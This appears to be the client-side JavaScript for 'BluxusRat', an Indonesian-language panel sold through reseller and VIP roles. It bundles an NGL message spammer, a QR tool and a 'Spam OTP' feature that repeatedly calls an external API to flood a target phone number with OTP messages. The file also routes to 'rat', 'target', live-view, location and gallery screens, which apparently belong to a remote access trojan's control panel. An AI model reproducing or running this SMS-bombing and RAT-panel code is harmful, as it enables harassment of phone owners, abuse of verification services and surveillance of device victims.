      const res = await fetch(`${CONFIG.FAZZ_API}/ngl?username=${encodeURIComponent(user)}&question=${encodeURIComponent(q)}&limit=${limit}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result) { $("#ngl-result").innerHTML = `<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:14px"><div style="background:#160d10;border:1px solid rgba(46,213,115,0.3);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#2ed573;font-weight:700;margin-bottom:6px">SUKSES</div><div style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#2ed573">${data.result.sent || 0}</div></div><div style="background:#160d10;border:1px solid rgba(255,51,51,0.3);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#ff3333;font-weight:700;margin-bottom:6px">GAGAL</div><div style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#ff3333">${data.result.failed || 0}</div></div><div style="background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#a39599;font-weight:700;margin-bottom:6px">TOTAL</div><div style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#f5f5f5">${limit}</div></div></div>`; toast("Terkirim!", "ok"); }
      else toast(data.message || "Gagal", "err");
    } catch (e) { toast("Koneksi error", "err"); }
    finally { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Kirim'; }
  };
}

function toolQR() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">URL to QR</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Ubah URL jadi QR code</div><div style="margin-bottom:14px"><input type="text" id="qr-url" placeholder="https://example.com" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><button class="btn btn-primary" id="qr-gen" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700"><i class="fa-solid fa-qrcode"></i> Generate</button><div id="qr-result"></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#qr-gen").onclick = async () => {
    const url = $("#qr-url").value.trim(); if (!url) return toast("Isi URL", "err");
    const btn = $("#qr-gen"); btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
    try {
      const res = await fetch(`${CONFIG.FAZZ_API}/qr?url=${encodeURIComponent(url)}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result?.qr_image) { $("#qr-result").innerHTML = `<div style="text-align:center;padding:20px;background:#0d0709;border:1px solid rgba(255,255,255,0.06);border-radius:16px;margin-top:14px"><img src="${data.result.qr_image}" alt="QR" style="width:200px;height:200px;background:#fff;padding:10px;border-radius:12px;display:block;margin:0 auto 12px"><div style="font-family:monospace;font-size:11px;color:#a39599;word-break:break-all;padding:8px 12px;background:#160d10;border-radius:8px;margin-bottom:12px">${url}</div><button class="btn btn-ghost" id="qr-copy" style="width:100%;padding:10px;border-radius:12px;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1);font-size:11px"><i class="fa-solid fa-copy"></i> Copy URL</button></div>`; $("#qr-copy").onclick = async () => { const ok = await copyToClipboard(url); toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err"); }; }
      else toast("Gagal generate QR", "err");
    } catch (e) { toast("Koneksi error", "err"); }
    finally { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-qrcode"></i> Generate'; }
  };
}

function toolOTP() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center;color:#ffc107">Spam OTP</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Blast OTP ke nomor target (VIP)</div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Nomor Target</label><input type="tel" id="otp-phone" placeholder="628xxxxxxxxxx" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="background:#0d0709;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:18px;margin-bottom:14px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px"><div style="font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:#f5f5f5"><i class="fa-solid fa-repeat" style="color:#ffc107"></i> PENGULANGAN</div><div style="padding:4px 10px;border-radius:20px;background:rgba(255,193,7,0.12);color:#ffc107;font-size:10px;font-weight:700" id="otp-total">= 22500</div></div><div style="display:flex;align-items:center;gap:10px;margin-bottom:14px"><div id="otp-minus" style="width:52px;height:52px;border-radius:14px;background:#160d10;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:center;font-size:22px;color:#f5f5f5;font-weight:700;cursor:pointer">−</div><div id="otp-rondes" style="flex:1;height:52px;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:14px;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-size:24px;font-weight:700;color:#f5f5f5">900</div><div style="font-size:14px;color:#a39599;font-weight:600;padding:0 4px">×</div><div id="otp-mult" style="flex:0.7;height:52px;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:14px;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-size:24px;font-weight:700;color:#f5f5f5">25</div><div id="otp-plus" style="width:52px;height:52px;border-radius:14px;background:#160d10;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:center;font-size:22px;color:#f5f5f5;font-weight:700;cursor:pointer">+</div></div><div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:14px" id="otp-multipliers"><div class="m-btn" data-m="1" style="padding:10px 16px;border-radius:12px;background:#160d10;border:1px solid rgba(255,255,255,0.06);font-size:13px;font-weight:700;color:#a39599;cursor:pointer">1x</div><div class="m-btn" data-m="2" style="padding:10px 16px;border-radius:12px;background:#160d10;border:1px solid rgba(255,255,255,0.06);font-size:13px;font-weight:700;color:#a39599;cursor:pointer">2x</div><div class="m-btn" data-m="3" style="padding:10px 16px;border-radius:12px;background:#160d10;border:1px solid rgba(255,255,255,0.06);font-size:13px;font-weight:700;color:#a39599;cursor:pointer">3x</div><div class="m-btn" data-m="5" style="padding:10px 16px;border-radius:12px;background:#160d10;border:1px solid rgba(255,255,255,0.06);font-size:13px;font-weight:700;color:#a39599;cursor:pointer">5x</div><div class="m-btn" data-m="10" style="padding:10px 16px;border-radius:12px;background:#160d10;border:1px solid rgba(255,255,255,0.06);font-size:13px;font-weight:700;color:#a39599;cursor:pointer">10x</div><div class="m-btn active" data-m="25" style="padding:10px 16px;border-radius:12px;background:linear-gradient(135deg,#ffc107,#ff9800);border:1px solid #ffc107;font-size:13px;font-weight:700;color:#1a1000;cursor:pointer;box-shadow:0 4px 12px rgba(255,193,7,0.4)">25x</div></div></div><div style="display:grid;grid-template-columns:2fr 1fr;gap:10px;margin-bottom:14px"><button id="otp-start" style="padding:18px;border-radius:14px;background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;font-size:13px;font-weight:800;text-transform:uppercase;border:none;cursor:pointer"><i class="fa-solid fa-play"></i> START</button><button id="otp-reset" style="padding:18px;border-radius:14px;background:#160d10;border:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:center;font-size:18px;color:#a39599;cursor:pointer"><i class="fa-solid fa-rotate-left"></i></button></div><div style="background:#0d0709;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:18px;margin-bottom:14px"><div style="display:flex;align-items:center;gap:12px;margin-bottom:14px"><div style="width:38px;height:38px;border-radius:11px;background:rgba(255,193,7,0.12);display:flex;align-items:center;justify-content:center"><i class="fa-solid fa-rotate" style="font-size:15px;color:#ffc107"></i></div><div style="flex:1"><div style="font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:2px">PROGRES</div><div id="otp-progress-text" style="font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:#f5f5f5">idle</div></div><div id="otp-pct" style="padding:5px 10px;border-radius:20px;background:rgba(255,193,7,0.12);color:#ffc107;font-size:11px;font-weight:700">0%</div></div><div style="width:100%;height:6px;background:#160d10;border-radius:3px;overflow:hidden;margin-bottom:16px"><div id="otp-fill" style="height:100%;width:0%;background:linear-gradient(90deg,#ffc107,#ff9800);border-radius:3px;transition:width .3s"></div></div><div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px"><div style="background:#160d10;border:1px solid rgba(46,213,115,0.3);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#2ed573;font-weight:700;margin-bottom:6px">SUKSES</div><div id="otp-succ" style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#2ed573">0</div></div><div style="background:#160d10;border:1px solid rgba(255,51,51,0.3);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#ff3333;font-weight:700;margin-bottom:6px">GAGAL</div><div id="otp-fail" style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#ff3333">0</div></div><div style="background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 8px;text-align:center"><div style="font-size:9px;color:#a39599;font-weight:700;margin-bottom:6px">TOTAL</div><div id="otp-total-count" style="font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#f5f5f5">0</div></div></div></div><div id="otp-console" style="background:#050304;border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:14px;font-family:monospace;font-size:11px;line-height:1.7;max-height:280px;overflow-y:auto"></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`;
  $("#modal").classList.add("show");
  initOTP();
}

function initOTP() {
  const state = { rondes: 900, mult: 25, current: 0, running: false, success: 0, fail: 0, stopFlag: false };
  const upd = () => { $("#otp-rondes").textContent = state.rondes; $("#otp-mult").textContent = state.mult; const total = state.rondes * state.mult; $("#otp-total").textContent = `= ${total}`; $("#otp-total-count").textContent = `${state.success + state.fail}/${total}`; };
  $("#otp-minus").onclick = () => { if (state.rondes > 1) { state.rondes--; upd(); } };
  $("#otp-plus").onclick = () => { if (state.rondes < 999) { state.rondes++; upd(); } };
  $$("#otp-multipliers .m-btn").forEach(b => { b.onclick = () => { $$("#otp-multipliers .m-btn").forEach(x => { x.classList.remove("active"); x.style.background = "#160d10"; x.style.color = "#a39599"; }); b.classList.add("active"); b.style.background = "linear-gradient(135deg,#ffc107,#ff9800)"; b.style.color = "#1a1000"; state.mult = parseInt(b.dataset.m); upd(); }; });
  $("#otp-reset").onclick = () => { state.current = 0; state.success = 0; state.fail = 0; state.stopFlag = true; setTimeout(() => state.stopFlag = false, 100); upd(); $("#otp-console").innerHTML = ""; $("#otp-fill").style.width = "0%"; $("#otp-pct").textContent = "0%"; };
  $("#otp-start").onclick = async () => {
    const phone = $("#otp-phone").value.trim(); if (!phone) return toast("Isi nomor target", "err");
    if (state.running) { state.stopFlag = true; return; }
    state.running = true; state.stopFlag = false;
    for (let r = state.current; r < state.rondes; r++) { if (state.stopFlag) break; state.current = r; await spamOneRound(phone, state); upd(); }
    state.running = false;
  };
  upd();
}
async function spamOneRound(phone, state) {
  try { const res = await fetch(`${CONFIG.FAZZ_API}/otpblast?phone=${phone}&api_key=${CONFIG.FAZZ_KEY}`); const data = await res.json(); if (data.status === "success" || data.result) { for (let i = 0; i < state.mult; i++) { state.success++; } } } catch (e) { state.fail++; }
  const total = state.rondes * state.mult, done = state.success + state.fail, pct = Math.min(100, Math.round(done / total * 100));
  $("#otp-fill").style.width = pct + "%"; $("#otp-pct").textContent = pct + "%"; $("#otp-succ").textContent = state.success; $("#otp-fail").textContent = state.fail; $("#otp-total-count").textContent = `${done}/${total}`; $("#otp-progress-text").textContent = `Ronde ${state.current + 1}/${state.rondes}`;
}

function goBenefit() { showScreen("benefit"); renderRoleCards(); renderFAQ(); }
function renderRoleCards() {
  const container = $("#role-cards");
  const order = ["owner", "reseller", "vip", "member"];
  container.innerHTML = order.map(key => {
    const r = PRICE_DATA[key];
    const colors = { owner: "#c41e28,#8b0000", reseller: "#2ed573,#1a9e4f", vip: "#ffc107,#ff9800", member: "#70a1ff,#4a7bd6" };
    return `<div class="role-card ${key}"><div style="display:flex;align-items:center;gap:12px;margin-bottom:12px"><div style="width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:linear-gradient(135deg,${colors[key]})"><i class="fa-solid ${r.icon}" style="font-size:18px;color:#fff"></i></div><div style="flex:1"><div style="font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;color:#f5f5f5">${r.label}</div><div style="font-size:11px;color:#a39599;margin-top:2px">${r.tagline}</div></div></div><div style="font-size:12px;color:#a39599;line-height:1.7;margin-bottom:12px">${r.desc}</div><div style="display:flex;flex-direction:column;gap:6px">${r.benefits.map(b => `<div style="display:flex;align-items:flex-start;gap:8px;font-size:12px;color:#f5f5f5"><i class="fa-solid fa-check" style="font-size:11px;margin-top:3px;color:#2ed573;flex-shrink:0"></i><span>${b}</span></div>`).join("")}</div></div>`;
  }).join("");
}
function renderFAQ() {
  const list = $("#faq-list");
  list.innerHTML = FAQ_DATA.map((f, i) => `<div class="faq-item" data-faq="${i}"><div class="faq-q" style="display:flex;justify-content:space-between;align-items:flex-start;gap:10px;font-size:13px;font-weight:700;color:#f5f5f5;cursor:pointer;line-height:1.5"><span>${f.q}</span><i class="fa-solid fa-chevron-right" style="color:#5a4548;transition:.2s;flex-shrink:0;margin-top:3px;font-size:12px"></i></div><div class="faq-a" style="font-size:12px;color:#a39599;line-height:1.7;margin-top:10px;padding-left:4px;display:none">${f.a}</div></div>`).join("");
  $$(".faq-item").forEach(item => { item.querySelector(".faq-q").onclick = () => { haptic(8); item.classList.toggle("open"); const a = item.querySelector(".faq-a"), i = item.querySelector(".faq-q i"); if (item.classList.contains("open")) { a.style.display = "block"; i.style.transform = "rotate(90deg)"; i.style.color = "#e02630"; } else { a.style.display = "none"; i.style.transform = "rotate(0)"; i.style.color = "#5a4548"; } }; });
}

function goAccount() {
  showScreen("account");
  const u = State.user || {};
  $("#acc-usn").textContent = u.username || "—";
  const r = $("#acc-role"), role = u.role || "member";
  r.textContent = role; r.className = "urole " + role;
  $("#acc-usercode").textContent = u.userCode || "—";
  $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
  if (u.avatar) $("#acc-avatar").src = u.avatar;
}

function goPanel() {
  const u = State.user || {}, role = u.role || "member";
  const perms = ROLE_PERMS[role] || { panel: [] };
  showScreen("panel");
  $("#panel-title").textContent = `${role.charAt(0).toUpperCase() + role.slice(1)} Panel`;
  $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;
  if (!perms.panel.length) { $("#panel-grid").innerHTML = '<div style="text-align:center;color:#5a4548;font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>'; return; }
  $("#panel-grid").innerHTML = perms.panel.map(p => `<div class="panel-action" data-action="${p.id}"><div class="ico-badge"><i class="fa-solid ${p.icon}"></i></div><div class="txt">${p.name}</div></div>`).join("");
  $$(".panel-action").forEach(el => el.onclick = () => { haptic(10); openPanelAction(el.dataset.action); });
}

function openPanelAction(action) {
  const box = $("#modal-box");
  const forms = {
    add_user: `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:18px;text-align:center">Tambah Akun</h3><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Username</label><input id="f-usn" placeholder="username" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Password</label><input type="password" id="f-pw" placeholder="min 6 karakter" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Role</label><select id="f-role" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px">${(CREATE_PERMS[State.user.role] || []).map(r => `<option value="${r}">${r.charAt(0).toUpperCase() + r.slice(1)}</option>`).join("")}</select></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Masa Aktif</label><select id="f-days" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div><button class="btn btn-primary" id="btn-submit-add" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700">Buat Akun</button><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`,
    broadcast: `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:18px;text-align:center">Broadcast</h3><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Judul</label><input id="f-bc-title" placeholder="Judul" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Pesan</label><textarea id="f-bc-msg" placeholder="Tulis pesan..." style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px;resize:vertical;min-height:80px;font-family:inherit"></textarea></div><button class="btn btn-primary" id="btn-submit-bc" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700">Kirim</button><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Tutup</button></div>`
  };
  box.innerHTML = forms[action] || '<h3 style="text-align:center">Coming soon</h3><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px">Tutup</button></div>';
  $("#modal").classList.add("show");
  if (action === "add_user") bindAddUser();
  if (action === "broadcast") bindBroadcast();
}

function bindAddUser() {
  $("#btn-submit-add").onclick = async () => {
    haptic(15);
    const usn = $("#f-usn").value.trim(), pw = $("#f-pw").value, role = $("#f-role").value, days = $("#f-days").value;
    if (!usn || !pw) return toast("Isi semua field", "err");
    if (pw.length < 6) return toast("Password min 6 karakter", "err");
    try {
      const usersSnap = await fbGet(fbRef(State.db, "users"));
      const users = usersSnap.exists() ? usersSnap.val() : {};
      for (const uid in users) if (users[uid].username === usn) return toast("Username udah dipake", "err");
      const salt = genSalt(), hash = await sha256(pw + salt), userCode = genUserCode();
      const newRef = fbPush(fbRef(State.db, "users"));
      await fbSet(newRef, { username: usn, passwordHash: hash, passwordSalt: salt, role, userCode, createdBy: State.uid, createdAt: Date.now(), expiresAt: days ? Date.now() + parseInt(days) * 86400000 : null, banned: false, avatar: "" });
      toast(`Akun ${usn} dibuat. Code: ${userCode}`, "ok", 6000); closeModal();
    } catch (e) { toast("Gagal: " + e.message, "err"); }
  };
}

function bindBroadcast() {
  $("#btn-submit-bc").onclick = async () => {
    haptic(15);
    const title = $("#f-bc-title").value.trim(), msg = $("#f-bc-msg").value.trim();
    if (!msg) return toast("Isi pesan", "err");
    try { const bRef = fbPush(fbRef(State.db, "broadcasts")); await fbSet(bRef, { title, message: msg, fromUid: State.uid, createdAt: Date.now() }); toast("Broadcast terkirim", "ok"); closeModal(); }
    catch (e) { toast("Gagal: " + e.message, "err"); }
  };
}

function openSettings() {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">Settings</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Ubah password & foto profil</div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Password Lama</label><input type="password" id="set-old" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Password Baru</label><input type="password" id="set-new" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><div style="margin-bottom:14px"><label style="display:block;font-size:10px;color:#a39599;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:8px">Konfirmasi</label><input type="password" id="set-conf" style="width:100%;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5f5f5;padding:13px 14px;font-size:13px"></div><button class="btn btn-primary" id="btn-save-pw" style="width:100%;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700">Save</button><div style="height:10px"></div><button class="btn btn-ghost" id="btn-pick-photo" style="width:100%;padding:15px;border-radius:12px;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1);font-size:13px;font-weight:700">Ganti Foto Profil</button><input type="file" id="file-photo" accept="image/*" style="display:none"><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Close</button></div>`;
  $("#modal").classList.add("show");
  $("#btn-save-pw").onclick = async () => {
    haptic(15);
    const o = $("#set-old").value, n = $("#set-new").value, c = $("#set-conf").value;
    if (!o || !n) return toast("Isi semua field", "err");
    if (n !== c) return toast("Konfirmasi gak cocok", "err");
    if (n.length < 6) return toast("Min 6 karakter", "err");
    const oh = await sha256(o + State.user.passwordSalt);
    if (oh !== State.user.passwordHash) return toast("Password lama salah", "err");
    const salt = genSalt(), hash = await sha256(n + salt);
    await fbUpdate(fbRef(State.db, "users/" + State.uid), { passwordHash: hash, passwordSalt: salt });
    State.user.passwordHash = hash; State.user.passwordSalt = salt;
    toast("Password diubah", "ok"); closeModal();
  };
  $("#btn-pick-photo").onclick = () => $("#file-photo").click();
  $("#file-photo").onchange = (e) => { const f = e.target.files[0]; if (!f) return; if (f.size > 400000) return toast("Foto max 400KB", "err"); const r = new FileReader(); r.onload = async (ev) => { const b64 = ev.target.result; State.user.avatar = b64; $("#acc-avatar").src = b64; await fbUpdate(fbRef(State.db, "users/" + State.uid), { avatar: b64 }); toast("Foto profil diubah", "ok"); }; r.readAsDataURL(f); };
}

function doLogout() {
  haptic(15);
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">Log Out</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:18px">Yakin mau keluar?</div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Batal</button><button class="btn btn-primary" id="btn-confirm-logout" style="flex:1;padding:15px;border-radius:12px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;font-size:13px;font-weight:700">Log Out</button></div>`;
  $("#modal").classList.add("show");
  $("#btn-confirm-logout").onclick = () => {
    localStorage.removeItem("bluxus_uid"); State.user = null; State.uid = null;
    if (State.audio) { State.audio.pause(); State.audio = null; }
    if (State.unsubLive) State.unsubLive(); if (State.unsubLoc) State.unsubLoc(); if (State.unsubGallery) State.unsubGallery();
    closeModal(); showScreen("login"); $("#login-usn").value = ""; $("#login-pw").value = "";
  };
}

function closeModal() { $("#modal").classList.remove("show"); }

function bindEvents() {
  $("#btn-login").onclick = doLogin;
  $("#login-pw").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
  ["", "-rat", "-tools", "-account", "-about", "-panel", "-anime", "-benefit", "-changelog"].forEach(suf => { const b = $("#btn-hamburger" + suf); if (b) b.onclick = openSidebar; });
  $("#sidebar-backdrop").onclick = closeSidebar;
  $$(".sb-item").forEach(el => { el.onclick = () => goPage(el.dataset.page); });
  $("#btn-target-back").onclick = () => { haptic(8); goRat(); };
  $$(".fp-back").forEach(b => { b.onclick = () => { haptic(8); closeAllFeaturePages(); if (State.unsubLive) State.unsubLive(); if (State.unsubLoc) State.unsubLoc(); }; });
  $("#btn-settings").onclick = () => { haptic(10); openSettings(); };
  $("#btn-logout").onclick = doLogout;
  $("#btn-change-photo").onclick = () => { haptic(10); openSettings(); };
  $("#btn-upgrade-role").onclick = () => { haptic(10); window.open(`https://wa.me/${CONFIG.WA_ADMIN}?text=${encodeURIComponent("Halo, saya mau upgrade role BluxusRat")}`, "_blank"); };
  $("#btn-copy-usercode").onclick = async () => { haptic(20); const code = State.user?.userCode || ""; if (!code) return toast("User code kosong", "err"); const ok = await copyToClipboard(code); const btn = $("#btn-copy-usercode"); if (ok) { toast("User code di-copy", "ok"); btn.classList.add("copied"); btn.innerHTML = '<i class="fa-solid fa-check"></i>'; setTimeout(() => { btn.classList.remove("copied"); btn.innerHTML = '<i class="fa-solid fa-copy"></i>'; }, 2000); } else toast("Gagal copy", "err"); };
  $("#modal").addEventListener("click", e => { if (e.target === $("#modal")) closeModal(); });
  initPlayer(); initAnimeEvents();
}

async function init() {
  bindEvents();
  runLoading();
  setTimeout(async () => { watchConnection(); const resumed = await tryResume(); if (resumed) { $("#login-redirect").classList.add("show"); setTimeout(() => goDashboard(), 700); } }, 2500);
}

window.addEventListener("DOMContentLoaded", init);
window.closeModal = closeModal;
window.goPage = goPage;